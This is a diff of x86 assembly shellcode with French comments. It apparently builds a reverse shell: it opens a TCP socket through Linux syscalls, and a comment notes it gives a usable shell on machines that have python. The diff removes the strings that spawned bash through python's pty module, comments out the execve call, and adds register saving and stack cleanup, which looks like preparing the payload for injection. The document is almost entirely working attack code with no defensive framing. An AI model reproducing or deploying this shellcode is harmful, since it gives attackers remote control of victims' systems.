@@ -4,10 +4,6 @@
 ; Equivalent en C pris comme exemple : https://gist.github.com/0xabe-io/916cf3af33d1c0592a90
 
 section .data
-   bash: db "/bin/bash", 0
-   python: db "/bin/python", 0
-   command: db "-c",0
-   bash_arg: db "import pty", 0x3b , ' pty.spawn("bash")',0
 
 
 section .text
@@ -15,14 +11,19 @@ section .text
 _start:
 
 
-    push 0x66 
+
+ 
+    ;push de tous les registres pour la sauvegarde
+    pusha
+    ;create_socket 
+    push 0x66  ; voir syscall
     pop eax
-    push 0x1 
+    push 0x1 ; voir net.h 
     pop ebx
     xor ecx,ecx 
-    push ecx
-    push 1 
-    push 2
+    push ecx ; IPPROTO_IP
+    push 1  ; SOCK_STREAM 
+    push 2 ; AF_INET 
     mov ecx,esp 
     int 0x80
 
@@ -77,6 +78,8 @@ _start:
     xor ecx, ecx
 
     int 80h
+    
+
 
     ;;; Executable sur une machine uniquement équipée de python, mais renvoie un shell fortement utilisable
 
@@ -87,16 +90,18 @@ _start:
     ; push command
     ; push ebx
     ; mov ecx, esp
+    ;int 80h
 
-
-    int 80h
+    
+    add esp,48 ; Nous avons 12 push dans le code donc 4*12 = 48 
+    popa  ; récupération de tous les registres
     
 
     jmp _exit
 
 _exit:
     mov al, 1
-    mov bl, 0
+    xor bl, bl
     int 80h
 
   
